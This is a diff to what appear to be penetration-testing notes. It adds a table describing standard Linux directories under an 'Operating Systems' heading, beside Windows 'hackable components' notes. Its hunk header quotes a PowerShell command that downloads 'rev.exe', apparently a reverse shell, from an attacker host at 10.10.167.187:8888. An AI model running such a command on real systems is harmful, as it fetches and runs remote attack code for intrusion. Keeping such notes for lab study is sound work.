@@ -163,7 +163,30 @@ powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' 
 
 ## Operating Systems
 
+## Linux
+
+| Directory | Description                                                                            |
+|-----------|----------------------------------------------------------------------------------------|
+| /         | The root directory, the top-level directory in the filesystem.                         |
+| /bin      | Contains essential user command binaries.                                              |
+| /boot     | Contains the files needed to boot the system, such as the kernel and bootloader.       |
+| /dev      | Contains device files representing hardware and software devices.                      |
+| /etc      | Contains system-wide configuration files and directories.                              |
+| /home     | Contains user home directories.                                                        |
+| /lib      | Contains shared libraries needed by system programs.                                   |
+| /media    | Mount point for removable media, such as USB drives and CDs.                           |
+| /mnt      | Mount point for temporarily mounted filesystems.                                       |
+| /opt      | Contains optional application software packages.                                       |
+| /proc     | A virtual filesystem that provides process and kernel information.                     |
+| /root     | The home directory of the root user.                                                   |
+| /sbin     | Contains essential system binaries, mostly for administration.                         |
+| /srv      | Contains data for services provided by the system.                                     |
+| /sys      | A virtual filesystem that provides information about the kernel, devices, and drivers. |
+| /tmp      | Contains temporary files that can be used by applications.                             |
+| /usr      | Contains read-only user data, including binaries, libraries, and documentation.        |
+| /var      | Contains variable data, such as logs, databases, and mail.                             |u
 ## Windows 
+
 > Common Hackable components
 
 Writable Path for Windows
